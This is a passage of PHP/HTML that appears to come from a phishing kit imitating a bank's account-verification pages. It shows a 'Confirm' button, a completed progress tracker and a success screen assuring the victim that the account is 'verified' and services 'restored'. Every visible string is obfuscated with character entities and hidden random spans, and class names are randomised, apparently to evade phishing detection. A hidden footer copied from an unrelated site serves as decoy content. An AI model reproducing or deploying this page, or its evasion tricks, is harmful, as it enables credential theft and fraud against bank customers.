                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                                    <button id="mybtntwo" type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary touch"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;</span> </button>
                                                </div>

                                            </form>
                                        </div>
                                    </div>
                                </div>

                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui raised segment" id="congra" style="max-width: 470px!important; display:none;">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <div id="" align="center">
                                                <ol class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr" data-progtrckr-steps="4">
                                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                </ol>
                                            </div>
                                            <br>
                                            <br>

                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                    <div align="center">
                                                        <img width="120px" src="./img/congra.png">
                                                        <br>
                                                        <h4 style="color: #5a5757;"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#89;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;&comma;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;&comma;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#84;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;&period;</h4>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                                <button id="dort9awed" type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary touch"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;</span> </button>
                                                <hr style="border-top: 1.5px dotted #959595;">
                                                <button id="dort9awed2" style="background-color: #959595;" type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary touch"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#76;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#79;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;</span> </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                </main>
            </div>
            <br></br>
			<footer style="display:none;" id="footer_1-0" class="comp footer mntl-block" role="contentinfo" data-tracking-container="true">
<section id="footer__content_1-0" class="comp footer__content page-layout-section mntl-block" data-tracking-container="true">
<div id="footer__top_1-0" class="comp footer__top mntl-block">
<div id="footer__brand-content_1-0" class="comp footer__brand-content mntl-block">
<svg class="icon logo__text ">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#logo__text"></use>
</svg>
<div id="footer__social-block_1-0" class="comp footer__social-block mntl-block">
<svg class="icon avatar-3-up--b footer__social-avatar">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#avatar-3-up--b"></use>
</svg>
<nav id="social-follow_1-0" class="comp social-follow" role="navigation">
<div id="social-follow__heading_1-0" class="comp social-follow__heading mntl-text-block">
Follow Us</div>
<div class="social-follow__icons">
<a href="https://www.facebook.com/thebalancecom/" target="_blank" rel="noopener" class="social-follow__icon social-follow__facebook"> <svg class="icon icon-facebook">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-facebook"></use>
</svg>
<span class="social-follow__icon-text">Facebook</span>
</a>
<a href="https://twitter.com/thebalance/" target="_blank" rel="noopener" class="social-follow__icon social-follow__twitter"> <svg class="icon icon-twitter">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-twitter"></use>
</svg>
<span class="social-follow__icon-text">Twitter</span>
</a>
<a href="https://www.instagram.com/thebalancecom/" target="_blank" rel="noopener" class="social-follow__icon social-follow__instagram"> <svg class="icon icon-instagram">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-instagram"></use>
</svg>
<span class="social-follow__icon-text">Instagram</span>
</a>
<a href="https://www.linkedin.com/company/the-balance.com/" target="_blank" rel="noopener" class="social-follow__icon social-follow__linkedin"> <svg class="icon icon-linkedin">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-linkedin"></use>
</svg>
<span class="social-follow__icon-text">Linkedin</span>
</a>
</div>
</nav>
</div>
</div>
<div id="footer-links_1-0" class="comp footer-links">
<ul class="footer-links__list">
<li class="footer-links__item"><a href="https://www.thebalancesmb.com/about-us" data-component="footerLinks" data-type="ourStory" data-ordinal="1" class="footer-links__link" data-source="footerLinks">About Us</a></li>
<li class="footer-links__item"><a class="footer-links__link" href="https://www.dotdash.com/our-brands/" data-component="footerLinks" data-source="footerLinks" data-type="advertiseWithUs" data-ordinal="2" target="_blank" rel="noopener">Advertise</a></li>
<li class="footer-links__item"><a href="https://www.thebalancesmb.com/about-us#EditorialGuidelines" data-component="footerLinks" data-type="editorialGuidelines" data-ordinal="3" class="footer-links__link" data-source="footerLinks">Editorial Guidelines</a></li>
<li class="footer-links__item"><a href="http://jobs.jobvite.com/dotdash" target="_blank" rel="noopener nofollow" data-component="footerLinks" data-type="careersAtDotDash" data-ordinal="4" class="footer-links__link" data-source="footerLinks">Careers</a></li>
<li class="footer-links__item"><a href="https://www.thebalancesmb.com/about-us#ContactUs" data-component="footerLinks" data-type="contact" data-ordinal="5" class="footer-links__link" data-source="footerLinks">Contact</a></li>
<li class="footer-links__item"><a href="/terms-of-use-and-policies-the-balance-smb-4847378#the-balance-cookie-disclosure" data-component="footerLinks" data-type="cookiePolicy" data-ordinal="6" class="footer-links__link" data-source="footerLinks">Cookie Policy</a></li>
<li class="footer-links__item"><a href="/terms-of-use-and-policies-the-balance-smb-4847378#terms-of-use" data-component="footerLinks" data-type="termsOfUse" data-ordinal="7" class="footer-links__link" data-source="footerLinks">Terms of Use</a></li>
<li class="footer-links__item"><a href="/terms-of-use-and-policies-the-balance-smb-4847378#privacy-policy" data-component="footerLinks" data-type="privacyPolicy" data-ordinal="8" class="footer-links__link" data-source="footerLinks">Privacy Policy</a></li>
<li class="footer-links__item"><a href="/terms-of-use-and-policies-the-balance-smb-4847378#jurisdiction-specific-provisions" data-component="footerLinks" data-type="californiaPrivacyNotice" data-ordinal="9" class="footer-links__link" data-source="footerLinks">California Privacy Notice</a></li>
</ul>
</div>
</div>
<div id="footer__bottom_1-0" class="comp footer__bottom mntl-block">
<div id="family-nav_1-0" class="comp family-nav mntl-block">
<div id="family-nav__title_1-0" class="comp family-nav__title mntl-text-block">
Also From The Balance Team</div>
<div id="family-nav__items_1-0" class="comp family-nav__items mntl-block">
<a id="logo_2-0" class="comp family-nav__item logo mntl-block" rel="nofollow noopener" href="https://www.thebalance.com/" target="_blank">
<svg class="icon family-nav-money family-nav__logo-icon--money family-nav__logo-icon">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#family-nav-money"></use>
</svg>
The Balance
</a>
<a id="logo_4-0" class="comp family-nav__item logo mntl-block" rel="nofollow noopener" href="https://www.thebalancecareers.com/" target="_blank">
<svg class="icon family-nav-careers family-nav__logo-icon--careers family-nav__logo-icon">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#family-nav-careers"></use>
</svg>
The Balance: Careers
</a>
</div>
</div>
<a id="footer__truste-badge_1-0" class="comp footer__truste-badge mntl-truste-badge mntl-block" href="//privacy.truste.com/privacy-seal/validation?rid=ca0d012d-694f-4389-96b0-a5ffc246fa42" aria-label="Access TRUSTe's Enterprise Privacy Certification program" target="_blank" data-tracking-container="true" rel="noopener">
<img id="badge-image_1-0" class="comp badge-image mntl-block lazyloaded" data-src="//privacy-policy.truste.com/privacy-seal/seal?rid=ca0d012d-694f-4389-96b0-a5ffc246fa42" alt="TRUSTe" src="//privacy-policy.truste.com/privacy-seal/seal?rid=ca0d012d-694f-4389-96b0-a5ffc246fa42">
</a>
</div>
</section>
<section id="footer__dotdash-family-nav_1-0" class="comp footer__dotdash-family-nav page-layout-section mntl-block" data-tracking-container="true">
<nav id="mntl-dotdash-family-nav_1-0" class="comp mntl-dotdash-family-nav" role="navigation" data-tracking-container="true">
<div class="mntl-dotdash-family-nav__content l-container">
<svg class="icon mntl-dotdash-family-nav__logo ">
<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#mntl-dotdash-family-nav__logo"></use>
</svg>
<span class="mntl-dotdash-family-nav__title">
The Balance Small Business is part of the <a href="https://www.dotdash.com" class="mntl-dotdash-family-nav__title--link" target="_blank" rel="noopener">Dotdash</a> publishing family.
</span>
</div>
</nav>
</section>
</footer>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> footer">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> footer-container">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> container">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> social-links row">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-12"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> follow-us-text"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#70;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;&colon;</span>
                                <ul class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> icon-links">
                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> facebook"><span><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui iconaction touch" > <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui facebook icon" ></i></a>
                                        </span>
                                    </li>
                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> instagram"><span><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui iconaction touch" > <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui instagram icon" ></i></a>
                                        </span>
                                    </li>
                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> twitter"><span><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui iconaction touch" ><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui twitter icon" ></i></a>
                                        </span>
                                    </li>
                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> youtube"><span><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui iconaction touch" ><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui youtube icon" ></i></a>
                                        </span>
                                    </li>
                                    <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> linkedin"><span><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui iconaction touch" > <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui linkedin icon" ></i></a>
                                        </span>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> footer-links row implement-ada-features-enabled">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-12">
                                <ul>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;</a></span></li>
                                    <li><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui link"><a class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> link-anchor touch" ><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;</a></span></li>
